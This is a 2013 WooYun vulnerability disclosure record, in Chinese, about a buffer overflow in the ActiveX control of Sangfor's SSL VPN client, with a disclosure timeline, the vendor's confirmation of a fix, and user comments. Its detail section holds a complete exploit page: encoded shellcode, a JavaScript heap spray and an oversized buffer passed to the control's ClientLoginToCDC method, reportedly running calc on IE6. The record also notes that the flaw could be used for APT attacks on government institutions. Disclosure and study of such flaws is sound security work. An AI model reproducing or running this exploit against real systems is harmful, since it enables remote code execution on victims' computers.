{"id": 7119, "wybug_id": "wooyun-2013-038584", "wybug_title": "深信服Activex控件bufferoverflow漏洞", "wybug_corp": "深信服", "wybug_author": "想要减肥的胖纸", "wybug_date": "2013-09-30 04:19", "wybug_open_date": "2013-12-29 04:20", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出", "浏览器插件漏洞", "漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-29：\t细节向公众公开  简要描述： 对电信研究院渗透时候发现使用深信服的sslvpn，好奇的分析了一下。深信服的sslvpn使用范围比较广，可基于该漏洞进行apt攻击。国内的政府、科研机构存在被apt打击的风险。 详细说明：  \nC:\\Program Files\\Dranzer_GUI\\Dranzer_GUI>Dranzer.exe -i c:\\1.txt -lGenerating Interface for COM Object - {250587D2-6704-4479-8718-3C7E163B4213} CSClientManager Class*******************************************************************************Interface for COM Object - {250587D2-6704-4479-8718-3C7E163B4213} CSClientManager Class*******************************************************************************COM Object Filename : C:\\Program Files\\Sinfor\\SSL\\ClientComponent\\CSClientManagerPrj.dllMajor Version       : 4Minor Version       : 2Build Number        : 1Revision Number     : 3Product Version     : 4, 2, 1, 3Product Name        : CSClientManagerPrj ModuleCompany Name        :Legal Copyright     : Copyright 2009Comments            : SSL VPN CS Client ManagerFile Description    : CSClientManagerPrj ModuleFile Version        : 4, 2, 1, 3Internal Name       : CSClientManagerPrjLegal Trademarks    :Private Build       :Special Build       : 20081217Language            : not found**************************************************************************************************************************************************************\nDownload for the activex https://vpn.catr.cn\n\n   漏洞证明：  测试通过winxp sp3 IE6 run calc\n<html><body><object classid='clsid:250587D2-6704-4479-8718-3C7E163B4213' id=\"target\"></object> <script>shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+'%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+'%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+'%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+'%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+'%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+'%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e');nops=unescape('%u9090%u9090');headersize =20;slackspace= headersize + shellcode.length;while(nops.length < slackspace) nops+= nops;fillblock= nops.substring(0, slackspace);block= nops.substring(0, nops.length- slackspace);while( block.length+ slackspace<0x50000) block= block+ block+ fillblock;memory=new Array();for( counter=0; counter<200; counter++) memory[counter]= block + shellcode;buffer='';for( counter=0; counter<=1100; counter++) buffer+=unescape(\"%0D%0D%0D%0D\");target.ClientLoginToCDC(buffer,1,\"defaultv\",1,\"defaultv\",1,1);</script></body></html>\n   修复方案：  fix   版权声明：转载请注明来源 想要减肥的胖纸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2013-09-30 21:54 厂商回复：   最新状态： 2014-01-02：该问题已在10月初修复  ", "replys": "漏洞评价：\n评论\n     2013-09-30 05:22 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  提交时间：\t 2013-09-30 04:19。。。。。    \n     2013-09-30 08:27 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  MarK IT    \n     2013-09-30 08:30 |    \t\t小忆 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        | 跑江湖的，偶尔傻笑一下)\t\t \n  公网上N多深信服的设备，要火的节奏    \n     2013-11-28 14:00 |    \t\tbotak \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:6        | 只为xsser邀请码)\t\t \n  这个漏洞真心有价值    \n     2013-12-29 10:02 |    \t\t包子 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:6        | 共同交流，共同进步)\t\t \n  最容易fuzz最简单栈溢出,不过有利用价值的洞就是好洞    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}